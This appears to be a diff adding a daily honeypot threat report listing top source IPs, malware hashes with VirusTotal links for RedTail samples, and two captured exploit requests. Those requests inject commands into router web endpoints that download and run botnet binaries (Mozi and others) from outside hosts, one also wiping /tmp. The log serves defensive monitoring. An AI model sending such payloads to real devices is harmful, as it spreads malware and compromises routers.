@@ -1,0 +1,41 @@
+Top 5 IPs for 08-07-2024 :
+
+113.160.130.153
+43.156.185.119
+111.53.87.28
+189.174.107.94
+43.131.249.158
+
+Malware Observed:
+
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File name : redtail.arm7
+1e6cf26fcd119c9fc97766370f2748f9122ad35b7d8d2ebcf7b8295930411a94
+https://www.virustotal.com/gui/file/1e6cf26fcd119c9fc97766370f2748f9122ad35b7d8d2ebcf7b8295930411a94
+
+File name : redtail.arm8
+56571760676fa0d8a1807f9fee66c71f2eb1b71556aa3785ff327274f4c99464
+https://www.virustotal.com/gui/file/56571760676fa0d8a1807f9fee66c71f2eb1b71556aa3785ff327274f4c99464
+
+File name : redtail.i686
+9cb67c621edd02544d708f4c6471370c9e8586a2eb51751e22cf5ca65a74e743
+https://www.virustotal.com/gui/file/9cb67c621edd02544d708f4c6471370c9e8586a2eb51751e22cf5ca65a74e743
+
+File name : redtail.x86_64
+9d91caf99b4dd7e14a6630a8fe42e621111c2cc68c535f7758d1ece065e69c7f
+https://www.virustotal.com/gui/file/9d91caf99b4dd7e14a6630a8fe42e621111c2cc68c535f7758d1ece065e69c7f
+
+Commands/exploits observed:
+
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.216.244.56:50541/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;wget http://91.92.242.155/most-mpsl; chmod 777 most-mpsl; ./most-mpsl lblink;
